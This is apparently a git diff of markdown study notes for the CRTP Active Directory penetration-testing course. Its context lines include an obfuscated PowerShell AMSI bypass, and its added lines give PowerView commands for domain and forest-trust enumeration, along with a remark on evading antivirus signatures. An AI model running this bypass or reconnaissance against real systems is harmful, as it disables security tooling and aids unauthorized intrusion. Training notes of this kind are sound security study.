@@ -7,8 +7,9 @@ Commands and reference material useful for the CRTP course and Active Directory 
     - [AMSI Bypass](#AMSI-Bypass)
   - [Domain Enumeration](#Domain-Enumeration)  
     - [Powerview](#Powerview)
-      - [Domain](#Domain)
-      - [Users & Groups](#Users-&-Groups)
+      - [Domain](#Domain-Enum)
+      - - [Domain Trust](#Domain-Trust)
+      - [Users Groups Computers](#Users,-Groups,-&-Computers)
     - [AD PowerShell Module](#Active-Directory-PowerShell-Module)
 
 ## Shell Prep & Defense Evasion
@@ -35,9 +36,33 @@ sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE
 [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
 ```
 ## Domain Enumeration 
-#### Powerview 
+### Powerview 
 Powerview is referenced quite a bit in the course material, but the Microsoft-signed AD PowerShell Module can also be used and will typically evade AV sigs where PowerView may not if using an unmodified version. 
+
+#### Domain Enum
+
+```powershell 
+Get-NetDomain
+Get-NetDomain -Domain <domainname>
+Get-DomainSID
+Get-DomainPolicy (Get-DomainPolicy)."System Access" net accounts
 ```
+#### Domain Trust
+
+```powershell 
+Get-NetDomainTrust
+Get-NetForest
+Get-NetForestDomain
+Get-NetforestDomain -Forest <domain name>
+Get-NetForestCatalog
+Get-NetForestCatalog -Forest <domain name>
+Get-NetForestTrust
+Get-NetForestTrust -Forest <domain name>
+Get-NetForestDomain -Verbose | Get-NetDomainTrust
 ```
+#### Users, Groups, & Computers
+```powershell 
+```
+
 #### Active Directory PowerShell Module
 [Microsofts AD PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) module can also be used for domain enumeration. 
